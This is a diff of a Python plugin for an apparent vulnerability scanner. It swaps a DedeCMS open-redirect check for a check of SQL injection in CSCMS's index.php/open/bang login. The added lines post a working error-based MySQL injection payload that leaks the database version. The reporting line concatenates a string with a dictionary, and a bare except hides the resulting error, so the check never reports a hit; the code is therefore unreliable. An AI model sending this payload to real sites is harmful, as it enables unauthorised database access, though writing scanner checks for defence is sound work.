@@ -3,13 +3,14 @@
 
 import requests
 from dummy import *
+import re
 
 info = {
-	'NAME':'Dedecms /plus/download.php URL redirect',
-	'AUTHOR':'Ario,yangbh',
-	'TIME':'20140811',
+	'NAME':'CSCMS index php open bang sql injection',
+	'AUTHOR':'1c3z,wjk',
+	'TIME':'20150325',
 	'WEB':'',
-	'DESCRIPTION':''
+	'DESCRIPTION':'cscms index.php/open/bang sql injection,sql 报错注入'
 }
 opts = [
 	['url','http://testasp.vulnweb.com','target url'],
@@ -17,17 +18,17 @@ opts = [
 
 def Assign(services):
 	if services.has_key('url') and services.has_key('cms'):
-		if services['cms'] == 'DedeCms':
+		if services['cms'] == 'cscms':
 			return True
 	return False
 
 def Audit(services):
-	url = services['url'] + "/plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20%3D"
+	url = services['url'] +'/index.php/open/bang'
+	payload = {'openid':'x','denglu':'login','username':'a%27 and(select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1#','userpass':'bugscan'}
 	try:
-		rqu = requests.get(url)
-		if rqu.url == 'http://www.baidu.com':
-			security_note(url)
-
+		rqu =requests.post(url,data=payload)
+		if "for key 'group_key'" in rqu.text :
+			security_hole('find sql injection: ' + url+payload)
 	except:
 		pass
 # ----------------------------------------------------------------------------------------------------
